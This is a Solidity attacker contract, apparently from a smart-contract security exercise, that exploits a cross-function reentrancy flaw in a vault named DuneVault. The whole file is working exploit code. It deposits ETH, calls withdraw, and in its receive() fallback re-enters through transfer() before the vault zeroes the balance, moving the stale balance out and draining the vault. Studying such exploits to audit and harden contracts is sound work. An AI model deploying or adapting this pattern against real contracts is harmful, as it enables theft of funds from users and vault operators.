// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// RippleAttacker exploits the cross-function reentrancy vulnerability in DuneVault.
// Like a ripple spreading across shared state, the attacker reenters through a
// different function before balances are updated, draining the vault.

import "./DuneVault.sol";

contract RippleAttacker {
    DuneVault public duneVault;
    address public owner;

    constructor(address _duneVaultAddress) {
        duneVault = DuneVault(_duneVaultAddress);
        owner = msg.sender;
    }

    // Fallback triggered when DuneVault sends ETH during withdraw
    // Balance hasn't been zeroed yet — reenter through transfer(), not withdraw()
    // This moves the stale balance to the attacker's EOA
    receive() external payable {
        if (duneVault.balances(address(this)) > 0) {
            duneVault.transfer(owner, duneVault.balances(address(this)));
        }
    }

    // Function to start the attack by depositing some Ether into the vault
    function attack() public payable {
        require(msg.value >= 1 ether, "You need to send at least 1 Ether to start the attack");
        duneVault.deposit{value: msg.value}();
        duneVault.withdraw(msg.value);
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
